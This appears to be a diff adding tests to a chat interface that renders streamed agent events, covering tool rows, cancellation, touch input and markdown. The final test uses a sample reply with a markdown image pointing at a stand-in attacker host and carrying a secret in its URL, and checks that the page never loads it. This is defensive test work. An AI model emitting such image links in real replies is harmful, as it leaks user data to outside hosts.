@@ -150,3 +150,80 @@ test("after a reconnect the chat is rebuilt from the new snapshot, without dupli
   expect(screen.getAllByText("what is in the repo?")).toHaveLength(1);
   expect(screen.getByRole("img", { name: "connection open" })).toBeTruthy();
 });
+
+test("a tool row opened mid-turn stays open as the turn goes on and the run's snapshot lands", async () => {
+  const { log, play } = start();
+  await screen.findByText("what is in the repo?");
+  play(...said(4, "user", "look again"), { runId: "4", threadId: "mini", type: EventType.RUN_STARTED }, state({ phase: "running" }));
+  play(
+    { parentMessageId: "5", toolCallId: "t5", toolCallName: "Read", type: EventType.TOOL_CALL_START },
+    { delta: '{"file_path":"notes.md"}', toolCallId: "t5", type: EventType.TOOL_CALL_ARGS },
+    { toolCallId: "t5", type: EventType.TOOL_CALL_END },
+  );
+  fireEvent.click(await screen.findByText(/^Read/));
+  await screen.findByText(/"file_path":"notes\.md"/); // the input as logged, not re-serialised
+  play({ content: "# notes", messageId: "6", role: "tool", toolCallId: "t5", type: EventType.TOOL_CALL_RESULT }, ...said(7, "assistant", "It has notes."));
+  log([
+    { kind: "user", text: "look again" },
+    { kind: "tool", text: 'Read {"file_path":"notes.md"}' },
+    { kind: "echo", text: "# notes" },
+    { kind: "talk", text: "It has notes." },
+  ]);
+  play({ runId: "4", threadId: "mini", type: EventType.RUN_FINISHED }, snapshot([...LOG, { kind: "user", text: "look again" }, { kind: "tool", text: 'Read {"file_path":"notes.md"}' }, { kind: "echo", text: "# notes" }, { kind: "talk", text: "It has notes." }]), state({ phase: "idle" }));
+  await screen.findByText("It has notes.");
+  expect(screen.getByText(/"file_path":"notes\.md"/)).toBeTruthy(); // still open
+  expect(screen.getByText("# notes")).toBeTruthy();
+  const rows = [...document.querySelectorAll<HTMLElement>("[data-log-index]")].map((e) => e.dataset.logIndex);
+  expect(rows).toEqual(["0", "1", "3", "4", "5", "7"]);
+});
+
+test("cancelling, then sending: the new message gets its own bubble", async () => {
+  const { play } = start();
+  await screen.findByText("what is in the repo?");
+  play(...said(4, "user", "cancel me"), { runId: "4", threadId: "mini", type: EventType.RUN_STARTED }, state({ phase: "running" }));
+  play({ messageId: "5", role: "assistant", type: EventType.TEXT_MESSAGE_START }, { delta: "Streamed ", messageId: "5", type: EventType.TEXT_MESSAGE_CONTENT });
+  await screen.findByText(/Streamed/);
+  play({ messageId: "5", type: EventType.TEXT_MESSAGE_END }, { message: "cancelled", type: EventType.RUN_ERROR }, snapshot([...LOG, { kind: "user", text: "cancel me" }]), state({ phase: "idle" }));
+  await waitFor(() => {
+    expect(screen.queryByText(/Streamed/)).toBeNull();
+  });
+  play(...said(5, "user", "AFTER CANCEL"));
+  const bubble = await screen.findByText("AFTER CANCEL");
+  expect(bubble.closest("[data-testid=user-message]")?.textContent).toBe("AFTER CANCEL");
+});
+
+test("on a touch screen Enter is a new line and the send button sends the text as typed", async () => {
+  const realMatch = globalThis.matchMedia;
+  globalThis.matchMedia = (query: string) => {
+    const list = realMatch(query);
+    Object.defineProperty(list, "matches", { value: query === "(pointer: coarse)" });
+    return list;
+  };
+  try {
+    const { server } = start();
+    await screen.findByText("what is in the repo?");
+    const box = screen.getByLabelText("Message");
+    fireEvent.change(box, { target: { value: "  two\nlines  " } });
+    fireEvent.keyDown(box, { key: "Enter" });
+    expect(sentTexts(server.sent)).toEqual([]);
+    fireEvent.click(screen.getByRole("button", { name: "Send" }));
+    expect(sentTexts(server.sent)).toEqual([{ device: undefined, text: "  two\nlines  " }]);
+    fireEvent.change(box, { target: { value: " \n " } });
+    fireEvent.click(screen.getByRole("button", { name: "Send" }));
+    expect(sentTexts(server.sent)).toHaveLength(1); // a blank message isn't sent
+  } finally {
+    globalThis.matchMedia = realMatch;
+  }
+});
+
+test("a reply's markdown never loads an image", async () => {
+  const { play } = start();
+  await screen.findByText("what is in the repo?");
+  play(...said(4, "assistant", "look: ![tracker](https://evil.example/p.png?d=secret) and ![d](data:image/png;base64,AAAA)"));
+  await screen.findByText(/look:/);
+  await new Promise((resolve) => {
+    setTimeout(resolve, 50);
+  });
+  expect(document.querySelectorAll("img")).toHaveLength(0);
+  expect(document.body.innerHTML).not.toContain("evil.example/p.png");
+});
